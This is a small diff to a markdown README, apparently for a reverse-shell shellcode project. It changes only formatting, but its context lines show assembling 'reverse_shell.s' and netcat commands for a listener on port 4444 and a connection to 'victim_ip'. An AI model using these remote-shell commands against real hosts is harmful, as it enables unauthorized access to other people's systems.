@@ -30,20 +30,18 @@ $nasm -f bin reverse_shell.s -o reverse_shell_bin.o
 $cat reverse_shell_bin | hexdump -C
 
 ```
-## Exploit
+## :two: Exploit
 
 ### Reverse Tcp
 
 ```
 $netcat -v -l -p 4444
-
 ```
 
 ### Reverse Bind Tcp
 
 ```
 $netcat -v victim_ip 4444
-
 ```
 
 ### Reverse Tcp With CPP 
